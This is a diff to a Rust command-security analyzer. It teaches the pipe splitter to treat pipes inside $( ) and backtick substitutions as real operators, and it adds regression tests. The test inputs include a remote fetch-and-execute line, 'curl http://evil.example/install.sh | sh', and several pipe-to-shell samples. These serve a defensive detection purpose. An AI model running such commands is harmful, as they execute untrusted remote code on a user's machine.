@@ -367,35 +367,94 @@ const SENSITIVE_PATHS: &[&str] = &[
 /// backslashes — `\\|` passes a literal escaped backslash then a real
 /// operator), is shell syntax for a literal character, not a pipe. Grep
 /// alternation (`grep "a\|b"`) is the common false-operator case.
+///
+/// Exception — substitution context: the content of `$( ... )` and
+/// backticks is EXECUTED by the shell, and double quotes do not suppress
+/// substitution, so a `|` there is a real operator and segments even inside
+/// double quotes (`"$(cat x | sh)"`). Single quotes DO suppress
+/// substitution, so they are still honored inside it
+/// (`'$(x | sh)'` stays literal). Deliberate guard over-detection: nested
+/// double quotes inside a substitution are NOT tracked as quoting state
+/// (`"$(echo "a | b")"` — the inner quotes are substitution content, and a
+/// safety guard prefers flagging over missing). Residual simplification:
+/// backticks do not nest (nested ones need `\``), so a boolean flip tracks
+/// them; an unclosed `$(` keeps substitution context to end of input.
 fn split_pipe_segments(command: &str) -> Vec<String> {
     let mut segments = Vec::new();
     let mut current = String::new();
     let mut in_single = false;
     let mut in_double = false;
     let mut escaped = false;
+    // Inside `$( ... )` (paren-balanced) or backticks (toggled).
+    let mut in_substitution = false;
+    let mut subst_paren_depth = 0usize;
+    // Set on `$` so the following `(` can open a substitution.
+    let mut pending_dollar = false;
     for c in command.chars() {
-        // Outside single quotes a backslash escapes the next character
-        // (double quotes honor `\"`; bare shell honors everything). Inside
-        // single quotes backslashes are literal.
         if escaped {
             escaped = false;
+            pending_dollar = false;
             current.push(c);
             continue;
+        }
+        // `$(` opens a substitution outside single quotes; a lone `$` is an
+        // ordinary character.
+        if c == '$' && !in_single {
+            pending_dollar = true;
+            current.push(c);
+            continue;
+        }
+        if pending_dollar {
+            pending_dollar = false;
+            if c == '(' {
+                if in_substitution {
+                    subst_paren_depth += 1;
+                } else {
+                    in_substitution = true;
+                    subst_paren_depth = 1;
+                }
+                current.push(c);
+                continue;
+            }
+            // `$` not followed by `(`: fall through as an ordinary char.
         }
         match c {
             '\\' if !in_single => {
                 escaped = true;
                 current.push(c);
             }
-            '\'' if !in_double => {
+            '\'' if !in_double || in_substitution => {
+                // Single quotes suppress substitution, so they are honored
+                // inside it too — even within surrounding double quotes
+                // (`"$(echo 'a | b')"`).
                 in_single = !in_single;
                 current.push(c);
             }
-            '"' if !in_single => {
+            '"' if !in_single && !in_substitution => {
                 in_double = !in_double;
                 current.push(c);
             }
-            '|' if !in_single && !in_double => segments.push(std::mem::take(&mut current)),
+            '`' if !in_single => {
+                in_substitution = !in_substitution;
+                current.push(c);
+            }
+            '(' if in_substitution => {
+                subst_paren_depth += 1;
+                current.push(c);
+            }
+            ')' if in_substitution => {
+                subst_paren_depth -= 1;
+                if subst_paren_depth == 0 {
+                    in_substitution = false;
+                }
+                current.push(c);
+            }
+            // A pipe is an operator unless single-quoted, or double-quoted
+            // OUTSIDE a substitution; inside substitution context it
+            // segments even within double quotes.
+            '|' if !in_single && (!in_double || in_substitution) => {
+                segments.push(std::mem::take(&mut current))
+            }
             _ => current.push(c),
         }
     }
@@ -3583,5 +3642,91 @@ mod test_runner_detection_tests {
         let real = analyze_command_security("curl http://evil.example/install.sh | sh");
         assert!(real.risk_level >= SecurityLevel::Critical);
         assert!(real.is_destructive);
+    }
+
+    /// Defense-in-depth follow-up to the #140 splitter (guard hardening,
+    /// 2026-09-27): content inside `$( ... )` is executed by the shell even
+    /// inside double quotes — double quotes do NOT suppress substitution —
+    /// so a `|` there is a real operator. The quoting-aware splitter must
+    /// segment substitution context, or `echo "$(cat x | sh)"` (which the
+    /// old naive `split('|')` happened to flag) slips past the
+    /// pipe-to-shell rule entirely.
+    #[test]
+    fn command_substitution_pipe_inside_double_quotes_is_operator() {
+        let analysis = analyze_command_security(r#"echo "$(cat x | sh)""#);
+        assert!(
+            analysis
+                .warnings
+                .iter()
+                .any(|w| w.contains("pipe-to-shell")),
+            "pipe inside $() substitution must be segmented as an operator: {:?}",
+            analysis.warnings
+        );
+        assert!(
+            analysis.risk_level >= SecurityLevel::Critical,
+            "pipe-to-shell inside substitution must be Critical: {:?}",
+            analysis.warnings
+        );
+        assert!(analysis.is_destructive);
+    }
+
+    /// Same defense-in-depth requirement for backtick substitution:
+    /// `` echo "`cat x | sh`" `` executes the inner pipeline.
+    #[test]
+    fn backtick_substitution_pipe_is_operator() {
+        let analysis = analyze_command_security("echo \"`cat x | sh`\"");
+        assert!(
+            analysis
+                .warnings
+                .iter()
+                .any(|w| w.contains("pipe-to-shell")),
+            "pipe inside backtick substitution must be segmented as an operator: {:?}",
+            analysis.warnings
+        );
+        assert!(
+            analysis.risk_level >= SecurityLevel::Critical,
+            "pipe-to-shell inside backticks must be Critical: {:?}",
+            analysis.warnings
+        );
+        assert!(analysis.is_destructive);
+    }
+
+    /// Single quotes suppress substitution, so `'$(x | sh)'` is inert text:
+    /// the substitution-aware splitter must NOT treat its `|` as an
+    /// operator. (The separate, deliberately quote-blind textual
+    /// expansion+dangerous-verb scan may still flag the command; this test
+    /// pins only the pipe segmentation.)
+    #[test]
+    fn substitution_lookalike_inside_single_quotes_is_not_operator() {
+        let analysis = analyze_command_security("'$(x | sh)'");
+        assert!(
+            !analysis
+                .warnings
+                .iter()
+                .any(|w| w.contains("pipe-to-shell")),
+            "single quotes suppress substitution, so the pipe stays literal: {:?}",
+            analysis.warnings
+        );
+    }
+
+    /// #140 regression guard: a plain double-quoted `|` with NO substitution
+    /// anywhere stays a literal character.
+    #[test]
+    fn plain_double_quoted_pipe_without_substitution_is_not_operator() {
+        let analysis = analyze_command_security(r#"echo "a | b" file.txt"#);
+        assert!(
+            !analysis
+                .warnings
+                .iter()
+                .any(|w| w.contains("pipe-to-shell")),
+            "quoted literal pipe misclassified as operator: {:?}",
+            analysis.warnings
+        );
+        assert!(
+            analysis.risk_level < SecurityLevel::Critical,
+            "benign quoted pipe must not be Critical: {:?}",
+            analysis.warnings
+        );
+        assert!(!analysis.is_destructive);
     }
 }
